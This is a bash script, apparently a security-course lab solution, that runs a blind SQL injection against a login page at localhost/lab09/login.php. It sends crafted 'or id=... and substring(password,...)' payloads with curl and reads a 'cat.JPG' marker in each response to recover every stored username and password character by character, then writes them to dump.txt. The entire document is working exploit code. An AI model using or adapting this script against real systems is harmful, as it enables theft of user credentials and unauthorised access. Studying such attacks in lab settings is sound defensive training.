#!/bin/bash

for id in {0..100};
do
	dump=""

	# find out username length
	username_len=0
	for (( ; ;))
	do
		addr="u=\" or id=$id and length(username)>$username_len -- "
		# echo "$addr"
		curl -s --data "$addr" http://localhost/lab09/login.php > result.html
		
		file=$(<result.html)
		substring="cat.JPG"

		if [[ $file =~ $substring ]];
		then
			((username_len++))
		else
			# echo "$username_len"
			break	
		fi
	done

	# find out password length
	password_len=0
	for (( ; ;))
	do
		addr="u=\" or id=$id and length(password)>$password_len -- "
		# echo "$addr"
		curl -s --data "$addr" http://localhost/lab09/login.php > result.html
		
		file=$(<result.html)
		substring="cat.JPG"

		if [[ $file =~ $substring ]];
		then
			((password_len++))
		else
			# echo "$password_len"
			break	
		fi
	done
	dump="$dump\nid=$id; username_len=$username_len; password_len=$password_len"
	
	# blind attack on username
	username=""
	for ((pos = 1; pos<=username_len; pos++));
	do
		for((c=126; c>=48; c--));
		do
			x=$(printf '%x' $c)
			x=$(printf "\\x$x")
			
			# exception char: \
			if [ $c -eq 92 ];
			then
				x="\\$x"
			fi

			addr="u=\" or id=$id and substring(username,$pos,1)=\"$x\" -- "
			curl -s --data "$addr" http://localhost/lab09/login.php > result.html
			
			file=$(<result.html)
			substring="cat.JPG"

			if [[ $file =~ $substring ]];
			then
				username="$username$x"
				break
			fi
		done
	done
	dump="$dump\nusername: $username"

	# blind attack on password
	password=""
	for ((pos = 1; pos<=password_len; pos++));
	do
		for((c=126; c>=48; c--));
		do
			x=$(printf '%x' $c)
			x=$(printf "\\x$x")
			
			# exception char: \
			if [ $c -eq 92 ];
			then
				x="\\$x"
			fi

			addr="u=\" or id=$id and substring(password,$pos,1)=\"$x\" -- "
			curl -s --data "$addr" http://localhost/lab09/login.php > result.html
			
			file=$(<result.html)
			substring="cat.JPG"

			if [[ $file =~ $substring ]];
			then
				password="$password$x"
				break
			fi
		done
	done
	dump="$dump\npassword: $password"
	printf "$dump"
	printf "$dump" >> dump.txt
done